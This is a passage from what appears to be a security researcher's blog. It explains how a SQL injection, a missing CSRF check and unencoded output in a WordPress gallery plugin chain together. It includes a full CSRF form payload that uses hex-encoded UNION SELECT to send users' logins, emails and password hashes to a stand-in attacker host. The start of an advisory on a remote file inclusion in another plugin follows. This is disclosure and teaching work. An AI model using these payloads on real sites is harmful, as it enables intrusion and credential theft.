class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5e8f908950154-4"><span class="crayon-sy">$</span><span class="crayon-v">imageResults</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM $easy_gallery_image_table WHERE gid = $gid ORDER BY sortOrder ASC"</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5e8f908950154-5"><span class="crayon-sy">$</span><span class="crayon-v">gallery</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM $easy_gallery_table WHERE Id = $gid"</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5e8f908950154-6"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p>It pulls either the &#8220;select_gallery&#8221; or &#8220;galleryId&#8221; POST parameter. That&#8217;s then passed to two SQL queries without being cast to integers. That&#8217;s clue 1 right there that this is something we need to dig a bit deeper into. The file name is a clue that these pages are most likely not publicly accessible, as well as that there&#8217;s a check at the top of the file to ensure the file isn&#8217;t called directly. So this relies on somebody having access to the admin interface. And the admin needs to be silly enough to insert SQL into a query string parameter, but only blindly. We need to now establish whether or not the SQLi is blind or not.</p>
<p>A good clue is to grep the file for echo statements. Here are some examples:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5ea0594672702" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php } else if(isset($_POST['select_gallery']) || isset($_POST['galleryId'])) { ?&gt; 
&lt;h3&gt;Gallery: &lt;?php echo $gallery-&gt;name; ?&gt;&lt;/h3&gt;
.....
if(count($imageResults) &gt; 0) {
?&gt;
.....
&lt;p&gt;&lt;strong&gt;Image Path:&lt;/strong&gt; &lt;input type="text" name="edit_imagePath" size="75" value="&lt;?php echo $image-&gt;imagePath; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Image Title:&lt;/strong&gt; &lt;input type="text" name="edit_imageTitle" size="20" value="&lt;?php echo $image-&gt;title; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Image Description:&lt;/strong&gt; &lt;input type="text" name="edit_imageDescription" size="75" value="&lt;?php echo $image-&gt;description; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sort Order:&lt;/strong&gt; &lt;input type="text" name="edit_imageSort" size="10" value="&lt;?php echo $image-&gt;sortOrder; ?&gt;" /&gt;&lt;/p&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5ea0594672702-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5ea0594672702-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b5ea0594672702-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5ea0594672702-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b5ea0594672702-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5ea0594672702-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b5ea0594672702-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5ea0594672702-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b5ea0594672702-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5ea0594672702-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5ea0594672702-1"><span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5ea0594672702-2"><span class="crayon-o">&lt;</span><span class="crayon-i">h3</span><span class="crayon-o">&gt;</span><span class="crayon-i">Gallery</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$gallery</span><span class="crayon-o">-&gt;</span><span class="crayon-i">name</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">h3</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e78b5ea0594672702-3"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5ea0594672702-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">imageResults</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b5ea0594672702-5"><span class="crayon-sy">?</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5ea0594672702-6"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c98e78b5ea0594672702-7"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Path</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imagePath"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"75"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">imagePath</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5ea0594672702-8"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Title</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageTitle"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"20"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">title</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e78b5ea0594672702-9"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Description</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageDescription"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"75"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">description</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5ea0594672702-10"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Sort </span><span class="crayon-i">Order</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageSort"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"10"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">sortOrder</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0105 seconds] -->
<p>Bingo! Our injection vector is not blind. And what is more, keep in mind for later that no output encoding is done. This is important.</p>
<p><strong>CSRF vector</strong><br />
Without access to the WordPress administration interface directly, there&#8217;s a few means which we can achieve the delivery of a payload to exploit the SQL Injection vulnerability. Given that we need to deliver the items through the POST variables, we have to evaluate the application for the absence of any mitigation against CSRF attacks. In theory, a CSRF attack should be impossible. In reality though, many WordPress plugins do not CSRF protect their admin interfaces despite WordPress offering a very easy way of mitigating the attack.</p>
<p>Evaluating this for this attack vector can either be done by sampling a request with Burp Suite Pro and have it do the boring work of generating the appropriate form(Can be done by hand easily), or reading the code and see if there&#8217;s any actual CSRF tokens being inserted and validated anywhere that could be a kill joy for us. As it turns out, there&#8217;s a complete absence of this. So we now have a delivery method for a payload that could execute some arbitrary SQL and show the result to the user. But just outputting the list of users and their password to the admin user is rather boring. We need to find some way of exfiltration this data to us.</p>
<p><strong>Data exfiltration through XSS and magic quotes bypass</strong><br />
Remember back how we determined that the SQL results was in no way output encoded. It&#8217;s presumed of course that any data in the database was input by the admin, and as such completely not dangerous. What dangerous content can you possibly get from an integer column that auto-increments automagically? As it turns out, this is critical for turning this vulnerability into a beast.</p>
<p>We can&#8217;t possibly hope for the admin user to email us the result of the SQL injection output. So we need to somehow use the fact that we control the output of the SQL query to our advantage, and the fact that we can mostly unhindered write anything to the rendered page of the admin is a good start. So if we were able to put in either some JavaScript that&#8217;d infiltrate data for us, or a simple img tag which causes an external request, we can achieve our goal. Of course, the one thing that stops us is this pesky thing called magic quotes. We could try and put in some HTML into our SQL query, but if we have to use characters like quotes, magic quotes will make that a no-go. But what we can however do, is use the hex-literals feature that MySQL kindly offers us.</p>
<p>If you&#8217;ve never encountered hexadecimal literals before, you can try and neat little experiment in MySQL like this: SELECT CONCAT(&#8220;foo&#8221;, 0&#215;626172). This will output the string &#8220;foobar&#8221;. You can check out why by playing with the HEX and UNHEX methods, which will give you the hexadecimal values of different values. But slapping 0x in front of those values, it&#8217;ll act as if a string or integer for all intents and purposes. This offers us the wonderful ability to input arbitrary characters into a query using only hexadecimal digits(0-9 and A-F).</p>
<p><strong>Putting it all together</strong><br />
So far, we&#8217;ve determined:</p>
<ul>
<li>The plugin has a SQL injection vulnerability in the administrator interface</li>
<li>The SQLi is not blind</li>
<li>The output from the query is not output encoded</li>
<li>The plugin does not protect against CSRF attacks</li>
</ul>
<p>So we need to create a CSRF request which contains an image tag which contains an URL to a server we own, where the output of the SQL injection is in the src of the tag as a part of the query string. A bit of stitching together a CONCAT statement by encoding the HTML we need using HEX(), we end up with this result:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5eaf830006040" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="http://192.168.1.116/wordpress/wp-admin/admin.php?page=add-images" method="POST"&gt;
&lt;input type="hidden" name="galleryId" value="323432324 UNION SELECT CONCAT(0x223E3C696D67207372633D22687474703A2F2F7777772E6D796576696C736974652E63786D2F64656C69766572793F757365725F6C6F67696E3D, user_login, 0x26757365725F656D61696C3D, user_email, 0x26757365725F706173733D, user_pass, 0x22202F3E), 2, 3, 4, 5, 6 FROM wp_users #" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5eaf830006040-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5eaf830006040-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b5eaf830006040-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5eaf830006040-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-admin/admin.php?page=add-images"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5eaf830006040-2"><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"galleryId"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"323432324 UNION SELECT CONCAT(0x223E3C696D67207372633D22687474703A2F2F7777772E6D796576696C736974652E63786D2F64656C69766572793F757365725F6C6F67696E3D, user_login, 0x26757365725F656D61696C3D, user_email, 0x26757365725F706173733D, user_pass, 0x22202F3E), 2, 3, 4, 5, 6 FROM wp_users #"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e78b5eaf830006040-3"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>With that, we end up with valid rows of &#8220;images&#8221; in the $imageResults query. When the ID parameter now gets output onto the page, we now have a HTML tag for each user on the site, like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5eb9191913319" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;img src="http://www.myevilsite.cxm/delivery?user_login=admin&amp;amp;user_email=foobar@gmail.com&amp;amp;user_pass=$P$BSQhEGPcLUPtNHcu93k3aSddiQQsO6/"&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5eb9191913319-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5eb9191913319-1"><span class="crayon-o">&lt;</span><span class="crayon-e">img </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://www.myevilsite.cxm/delivery?user_login=admin&amp;amp;user_email=foobar@gmail.com&amp;amp;user_pass=$P$BSQhEGPcLUPtNHcu93k3aSddiQQsO6/"</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>When the page then renders, the image tags will try and fetch each of these URLs. Given that you own the domain contained in the injection, you can now fetch the HTTP logs and now you have a full set of hashes for the WordPress installation. Game over!</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/#comments" title="Comment on Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration">4 Comments</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-217 -->

				
					
<article id="post-213" class="post-213 post type-post status-publish format-standard hentry category-advisories tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/" title="4:44 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-12T16:44:34+00:00" pubdate>January 12, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/" title="Permalink to WordPress Floating Social Media Link Plugins Remote File Inclusion" rel="bookmark">WordPress Floating Social Media Link Plugins Remote File Inclusion</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<div><strong>Advisory</strong></div>
<p><a href="http://secunia.com/advisories/51346/"></p>
<div>Secunia Advisory SA51346</div>
<div></div>
<p></a></p>
<div><b>Analysis</b></div>
<div>The fsml-admin.js.php and fsml-hideshow.js.php both require a get parameter to specify the path for the wp-load.php file, used to initialize the WordPress backend.</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b6a66403557711" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//include the wordpress environment, so we can get the options and 
//write the js accordingly
REQUIRE $_GET['wpp'] . '/wp-load.php';</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b6a66403557711-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b6a66403557711-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b6a66403557711-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b6a66403557711-1"><span class="crayon-c">//include the wordpress environment, so we can get the options and </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b6a66403557711-2"><span class="crayon-c">//write the js accordingly</span></div><div class="crayon-line" id="crayon-53c98e78b6a66403557711-3"><span class="crayon-k ">REQUIRE</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wpp'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-load.php'</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->

</div>
<div>However the wpp parameter is used without validation that it does not contain a malicious input. We can thus provide an url to malicious PHP code, which will be executed by the remote host, like this:</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b6a75950925093" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
